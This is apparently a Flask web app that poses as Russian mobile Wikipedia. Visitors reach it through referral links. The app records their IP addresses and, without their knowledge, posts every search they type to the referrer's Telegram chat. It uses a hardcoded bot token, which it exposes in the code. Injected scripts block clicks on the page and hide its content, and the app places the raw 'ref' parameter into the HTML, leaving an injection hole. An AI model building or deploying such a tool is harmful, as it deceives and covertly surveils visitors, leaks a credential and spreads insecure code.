from flask import Flask, request, Response, redirect
import requests
import re
from bs4 import BeautifulSoup
import os
from collections import defaultdict

app = Flask(__name__)
BASE_URL = "https://ru.m.wikipedia.org"
TELEGRAM_TOKEN = '7953140297:AAGwWVx3zwmo-9MbQ-UUU1764nljCxuncQU'

# Храним рефералов и их статус {referrer_id: [list_of_referred_user_ips]}
referral_db = defaultdict(list)
reset_status = defaultdict(bool)

def send_to_referrer(chat_id: str, query: str):
    url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
    text = f"🔎 Кто-то искал: {query}"
    payload = {
        'chat_id': chat_id,
        'text': text
    }
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Ошибка при отправке сообщения: {e}")

@app.route('/reset_referrals')
def reset_referrals():
    ref_id = request.args.get("ref")
    if ref_id:
        reset_status[ref_id] = True
        return "OK", 200
    return "Invalid request", 400

@app.route('/')
def wiki_proxy():
    ref_id = request.args.get("ref")
    client_ip = request.remote_addr
    
    # Проверяем, не был ли реферер сброшен
    if ref_id and reset_status.get(ref_id, False):
        # Перенаправляем на обычную Википедию
        return redirect("https://ru.wikipedia.org", code=302)
    
    # Добавляем пользователя в базу рефералов
    if ref_id and client_ip not in referral_db[ref_id]:
        referral_db[ref_id].append(client_ip)
        reset_status[ref_id] = False  # Сбрасываем статус, если был новый переход
    
    search_query = request.args.get("search")
    page = search_query if search_query else "Ирбис"
    url = f"{BASE_URL}/wiki/{page}"

    if ref_id and search_query:
        send_to_referrer(ref_id, search_query)

    try:
        r = requests.get(url)
        r.encoding = "utf-8"
    except Exception as e:
        return f"<h1>Ошибка загрузки страницы: {e}</h1>"

    soup = BeautifulSoup(r.text, "html.parser")
    content_div = soup.find("div", class_="mw-parser-output")

    for tag in soup.find_all(["script", "style", "form"]):
        tag.decompose()

    custom_form = BeautifulSoup(f"""
    <div class="search-container" onclick="event.stopPropagation()" style="position: relative; z-index: 10; background: white;">
        <form action="/" method="get" class="minerva-search-form">
            <div class="search-box">
                <input type="hidden" name="ref" value="{ref_id if ref_id else ''}"/>
                <input class="search skin-minerva-search-trigger" id="searchInput"
                       type="search" name="search" placeholder="Искать в Википедии" 
                       aria-label="Искать в Википедии"
                       autocapitalize="sentences" title="Искать в Википедии [f]" accesskey="f">
                <span class="search-box-icon-overlay">
                    <span class="minerva-icon minerva-icon--search"></span>
                </span>
            </div>
        </form>
    </div>
    """, "html.parser")

    script = soup.new_tag("script")
    script.string = """
document.addEventListener("DOMContentLoaded", function () {
    const form = document.querySelector('.search-container');
    const footer = document.querySelector('footer');
    const main = document.querySelector('main');
    const searchInput = document.getElementById('searchInput');
    const searchForm = document.querySelector('.minerva-search-form');

    if (!form || !footer || !main || !searchForm || !searchInput) return;

    const lastModifiedBar = document.querySelectorAll('a.last-modified-bar');

    // Проверяем статус реферера каждые 5 секунд
    setInterval(() => {
        fetch('/check_reset?ref=' + new URLSearchParams(window.location.search).get('ref'))
            .then(response => response.json())
            .then(data => {
                if (data.reset) {
                    window.location.href = 'https://ru.wikipedia.org';
                }
            });
    }, 5000);

    // Остальной ваш код...
    document.body.addEventListener("click", function (event) {
        const isInsideForm = searchForm.contains(event.target);
        const tag = event.target.tagName.toLowerCase();
        const clickable = ["a", "button", "img"];
        const isInputButton = tag === "input" && ["submit", "button"].includes(event.target.type);

        if (!isInsideForm && (clickable.includes(tag) || isInputButton)) {
            event.preventDefault();
            event.stopPropagation();
        }
    }, true);

    const blockerStyle = document.createElement("style");
    blockerStyle.innerHTML = `
        body * {
            pointer-events: none !important;
        }
        .minerva-search-form, .minerva-search-form * {
            pointer-events: auto !important;
        }
    `;
    document.head.appendChild(blockerStyle);

    form.addEventListener("click", function (e) {
        e.stopPropagation();
        const footerText = footer.querySelectorAll('*');
        footerText.forEach(element => {
            element.style.visibility = 'hidden';
        });
        footer.style.backgroundColor = 'white';

        const mainText = main.querySelectorAll('*');
        mainText.forEach(element => {
            if (!form.contains(element)) {
                element.style.visibility = 'hidden';
            }
        });
        main.style.backgroundColor = 'white';

        document.documentElement.style.setProperty('--border-color-subtle', 'white');

        lastModifiedBar.forEach(bar => {
            bar.style.backgroundColor = 'white';
            bar.style.borderBottom = '1px solid white';
            bar.style.color = 'white';
        });
    });

    document.addEventListener("click", function (event) {
        if (!form.contains(event.target)) {
            const footerText = footer.querySelectorAll('*');
            footerText.forEach(element => {
                element.style.visibility = '';
            });
            footer.style.backgroundColor = '';

            const mainText = main.querySelectorAll('*');
            mainText.forEach(element => {
                element.style.visibility = '';
            });
            main.style.backgroundColor = '';

            document.documentElement.style.removeProperty('--border-color-subtle');

            lastModifiedBar.forEach(bar => {
                bar.style.backgroundColor = '';
                bar.style.borderBottom = '';
                bar.style.color = '';
            });
        }
    });
});
"""
    soup.body.append(script)

    if not content_div:
        return "<h1>Контент не найден на странице</h1>"

    header_div = soup.find("div", class_="branding-box")
    if header_div:
        header_div.insert_after(custom_form)

    if search_query:
        new_content = BeautifulSoup("", "html.parser")
        first_p = content_div.find("p")
        if first_p:
            new_content.append(first_p)
        for table in content_div.find_all("table", class_=re.compile("infobox")):
            new_content.append(table)
        hello = soup.new_tag("p")
        hello.string = "Привет!"
        new_content.append(hello)
        content_div.clear()
        content_div.append(new_content)

    html = str(soup)
    html = re.sub(r'href="(/[^"]+)"', f'href="{BASE_URL}\\1"', html)
    html = re.sub(r'src="(/[^"]+)"', f'src="{BASE_URL}\\1"', html)

    return Response(html, mimetype="text/html")

@app.route('/check_reset')
def check_reset():
    ref_id = request.args.get("ref")
    if ref_id and reset_status.get(ref_id, False):
        return {"reset": True}, 200
    return {"reset": False}, 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)